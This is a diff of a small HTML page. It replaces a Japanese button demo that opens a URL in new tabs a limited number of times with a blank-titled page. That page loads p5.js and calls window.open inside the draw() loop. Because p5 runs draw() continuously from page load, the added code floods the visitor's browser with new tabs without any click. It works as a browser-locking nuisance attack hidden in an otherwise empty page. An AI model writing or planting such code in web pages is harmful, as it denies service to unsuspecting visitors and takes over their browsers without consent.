@@ -1,29 +1,19 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html>
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>新しいタブを開く</title>
-    <script>
-        function openNewTab() {
-            window.open('https://tenyu0723.github.io', '_blank');
-        }
-
-        function openTabsContinuously() {
-            let i = 0;
-            const interval = setInterval(() => {
-                if (i < 10) {  // 10回まで開く
-                    openNewWindow();
-                    i++;
-                } else {
-                    clearInterval(interval);
-                }
-            }, 1000); // 1秒ごとに開く
-        }
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
 </head>
+
 <body>
-    <h1>新しいタブを開くデモ</h1>
-    <button onclick="openTabsContinuously()">新しいタブを開く</button>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.1.9/p5.min.js"></script>
+<script>
+function draw() {
+    window.open("https://tenyu0723.github.io", "_blank")
+}
+</script>
 </body>
+
 </html>
